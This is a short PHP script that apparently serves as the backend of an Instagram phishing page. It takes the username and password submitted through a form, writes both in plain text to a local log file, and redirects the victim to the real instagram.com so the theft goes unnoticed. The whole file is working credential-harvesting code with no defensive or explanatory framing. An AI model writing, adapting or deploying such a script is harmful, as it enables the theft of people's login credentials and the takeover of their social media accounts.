<?php


$username = $_POST['username'];
$password = $_POST['password'];

$fp = fopen('log.txt', 'a+');
fwrite($fp,'username:' . $username . "\n");
fwrite($fp,'password:' . $password . "\n");
fwrite($fp,'---------' . "\n");
fclose($fp);

header('Location: https://instagram.com');